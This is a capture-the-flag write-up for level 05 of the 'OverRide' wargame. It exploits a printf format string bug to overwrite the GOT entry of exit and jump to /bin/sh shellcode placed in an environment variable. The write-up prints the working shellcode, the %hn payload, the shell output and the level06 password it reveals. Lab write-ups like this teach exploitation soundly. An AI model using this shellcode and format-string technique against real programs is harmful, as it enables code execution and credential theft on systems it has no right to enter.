# Level 05

The only vulenerability we can get from a first look is the unsecure printf at the end
`printf(buf);`, possible format string exploit.
From the code we can also see that there is a `xor operation` which will transform all uppercase characters in lowercase, but there is No RELRO which gives us the possibility to overwrite the GOT entry of (exit). First we will find the offset from where we actually start writnig on the stack.

```c
level05@OverRide:~$ ./level05 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffd684 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
offset 10

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330

GOT address: "\xe0\x97\x04\x08"
Second we will create a PAYLOAD env variable and get its address.

level05@OverRide:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

level05@OverRide:/tmp$ cat getenv.c 
#include <stdio.h>

int main(int ac, char **av, char **env)
{
	printf("%p\n", getenv("PAYLOAD"));
	return 0;
}
level05@OverRide:/tmp$ gcc -m32 getenv.c 
getenv.c: In function ‘main’:
getenv.c:5:2: warning: format ‘%p’ expects argument of type ‘void *’, but argument 2 has type ‘int’ [-Wformat]
level05@OverRide:/tmp$ ./a.out 
0xffffdbaf

0xdbaf = 56239
(gdb) p /d 0xffff - 0xdbaf
$2 = 9296
```

Don't forget to actually subtract 8 ("PAYLOAD=") from the first pading (56239 - 8 = 56231)

```c
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56231x" + "%10$hn" + "%9296x" + "%11$hn"'; cat -) | ./level05
                                                f7fcfac0
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
